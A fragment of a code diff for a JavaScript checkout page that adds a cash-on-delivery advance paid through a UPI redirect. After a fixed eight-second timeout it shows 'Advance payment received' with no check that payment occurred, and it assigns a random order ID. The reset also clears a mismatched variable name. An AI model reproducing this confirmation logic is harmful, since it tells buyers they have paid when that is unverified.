+  } else {
+    advanceAmt = Math.min(PAYMENT_CFG.codAdvanceValue, totalAmount);
+    noteText   = 'Fixed advance';
+  }
+
+  var remaining = totalAmount - advanceAmt;
+  document.getElementById('codAdvanceAmount').textContent   = '₹' + advanceAmt.toLocaleString('en-IN');
+  document.getElementById('codAdvanceNote').textContent     = noteText;
+  document.getElementById('codRemainingAmount').textContent = '₹' + remaining.toLocaleString('en-IN');
+
+  window._codAdvanceAmount   = advanceAmt;
+  window._codRemainingAmount = remaining;
+
+  document.getElementById('codModal').style.display = 'flex';
+}
+
+function closeCodModal() {
+  document.getElementById('codModal').style.display = 'none';
+}
+
+function processCodAdvance(app) {
+  var advanceAmt = window._codAdvanceAmount || 0;
+  if (advanceAmt <= 0) {
+    closeCodModal();
+    showSuccess('cod', null);
+    return;
+  }
+  var upiUrl = buildUpiUrl(app || 'upi', advanceAmt);
+  closeCodModal();
+  window.location.href = upiUrl;
+  setTimeout(function() { showSuccess('cod', null); }, 8000);
+}
+
+function showSuccess(type, paymentId) {
   var orderId = Math.floor(Math.random() * 8529059999 + 1015015);
   document.getElementById('orderIdDisplay').textContent = orderId;
+
+  var msg  = 'Thank you! Your payment is being processed.';
+  var note = '';
+  if (type === 'cod') {
+    msg  = '🚚 COD Order Confirmed! Advance payment received.';
+    note = 'Remaining ₹' + (window._codRemainingAmount || 0).toLocaleString('en-IN') + ' to be paid on delivery.';
+  }
+  document.getElementById('successMsg').textContent  = msg;
+  document.getElementById('successNote').textContent = note;
+
   navigate('success');
-  // Reset form
   document.getElementById('addressForm').reset();
   currentAddress = {};
   selectedPayment = '';
@@ -1094,6 +1235,8 @@ function showSuccess() {
   document.querySelectorAll('input[name="payMethod"]').forEach(function(r) {
     r.checked = false;
   });
+  window._codAdvancePaise    = 0;
+  window._codRemainingAmount = 0;
 }
 
 // ─────────────────────────────────────────
